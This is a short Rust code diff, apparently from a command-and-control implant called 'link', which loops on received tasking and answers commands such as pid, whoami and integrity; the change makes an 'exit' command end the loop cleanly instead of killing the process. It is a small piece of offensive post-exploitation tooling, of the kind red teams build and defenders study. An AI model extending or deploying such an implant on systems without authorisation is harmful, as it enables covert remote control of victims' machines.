@@ -91,6 +91,9 @@ pub fn link_loop() {
         if recv_task.tasking.len() > 0 {
             // time to exec the command
             send_task.q = link_command(recv_task.q);
+            if send_task.q.clone() == "exit".to_string() {
+                break;
+            }
             send_task.tasking = recv_task.tasking;
             recv_task.q = String::new();
             recv_task.tasking = String::new();
@@ -121,7 +124,7 @@ fn link_command(command: String) -> String {
         "pid"               => pid().to_string(),
         "whoami"            => String::from(format!("{}\\{}", hostname(), username())),
         "integrity"         => integrity(),
-        "exit"              => std::process::exit(0),
+        "exit"              => return "exit".to_string(),
         _                   => String::from(format!("not a command")),
     }
 }
